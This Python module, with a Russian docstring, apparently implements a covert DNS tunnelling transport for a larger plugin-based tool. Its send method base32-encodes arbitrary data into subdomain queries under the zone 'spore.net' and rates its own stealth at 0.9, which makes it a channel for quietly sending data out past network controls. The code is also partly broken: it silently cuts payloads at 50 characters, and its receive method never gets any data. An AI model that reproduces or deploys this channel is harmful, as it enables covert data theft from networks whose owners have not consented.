"""DNS-транспорт: туннель через DNS-запросы."""
import base64
import socket
from .base import Transport


class DNSTransport(Transport):
    name = "dns"

    def __init__(self, resolver="8.8.8.8", zone="spore.net"):
        super().__init__()
        self.resolver = resolver
        self.zone = zone
        self._inbox = []

    def available(self):
        try:
            socket.gethostbyname("example.com")
            return True
        except Exception:
            return False

    def send(self, host, port, data):
        try:
            if isinstance(data, str):
                data = data.encode("utf-8")
            encoded = base64.b32encode(data).decode().lower().rstrip("=")
            if len(encoded) > 50:
                encoded = encoded[:50]
            query = encoded + "." + self.zone
            try:
                socket.gethostbyname(query)
            except Exception:
                pass
            return True
        except Exception:
            return False

    def receive(self, timeout=0.5):
        if self._inbox:
            return self._inbox.pop(0)
        return None

    def properties(self):
        return {"name": self.name, "speed": 0.2, "stealth": 0.9, "reliability": 0.7}